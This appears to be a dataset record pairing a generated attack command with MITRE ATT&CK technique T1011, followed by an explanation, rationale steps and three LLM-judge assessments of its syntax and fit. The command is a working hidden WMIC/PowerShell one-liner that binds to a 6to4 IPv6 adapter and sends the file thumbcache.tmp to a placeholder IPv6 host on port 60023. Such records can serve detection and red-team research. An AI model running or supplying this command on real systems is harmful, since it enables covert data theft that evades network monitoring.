command: wmic process call create "powershell -NoProfile -WindowStyle Hidden -Command `$ifc=Get-WmiObject Win32_NetworkAdapterConfiguration | ?{ `$_.IPEnabled -and (`$_.Description -like '*6to4*') }; if(`$ifc){ `$ip6=@(`$ifc.IPAddress | ?{ `$_ -like '*:*' })[0]; if(`$ip6){ `$c=New-Object Net.Sockets.TcpClient([Net.Sockets.AddressFamily]::InterNetworkV6); `$c.Client.Bind((New-Object Net.IPEndPoint ([Net.IPAddress]::Parse(`$ip6),0))); `$rv6=[Net.IPAddress]::Parse('2001:db8:2::44'); `$c.Connect(`$rv6,60023); `$s=`$c.GetStream(); `$b=[IO.File]::ReadAllBytes('C:\Users\Public\Pictures\thumbcache.tmp'); `$s.Write(`$b,0,`$b.Length); `$s.Close(); `$c.Close() } }"
explanation: Executes PowerShell through WMIC to bind to a 6to4 IPv6 interface and exfiltrate a file over IPv6 using a high TCP port. This leverages an alternate IPv6 transition medium in accordance with T1011.
rationale_steps: Locate the 6to4 adapter and extract an IPv6 address.
Bind an IPv6 TCP client to the selected interface.
Connect to an IPv6 external host on an uncommon port.
Transfer data over the 6to4 path instead of the primary network.
Keep changes confined to the exfiltration process.

llm_judgments.syntactic_justification: Well-formed WMIC and PowerShell with balanced quoting/braces and valid parameterization/escaping throughout.
llm_judgments.semantic_justification: Although it attempts IPv6-based exfiltration via a 6to4 interface, it relies on a rarely-present adapter and a non-routable documentation IPv6 address and aligns more with an alternate protocol than a different network medium per T1011.

llm_judgments.syntactic_justification: The command is perfectly well-formed with properly balanced quotes, parentheses, and braces, correct PowerShell syntax with appropriate backtick escaping, and valid WMIC process call create syntax.
llm_judgments.semantic_justification: The command perfectly aligns with T1011 by identifying a 6to4 IPv6 interface (an alternate network medium), binding to it, and exfiltrating a file over IPv6 to a remote server using a high port, bypassing potential monitoring on primary network channels.

llm_judgments.syntactic_justification: The command is perfectly well-formed, featuring correctly balanced quotes and parentheses, valid PowerShell syntax, and proper backtick escaping for dollar signs to ensure correct parsing when executed via WMIC.
llm_judgments.semantic_justification: The command precisely implements the claimed intent by programmatically identifying and binding to a 6to4 IPv6 network adapter, then exfiltrating a file over this specific IPv6 transition mechanism, perfectly aligning with the T1011 technique.
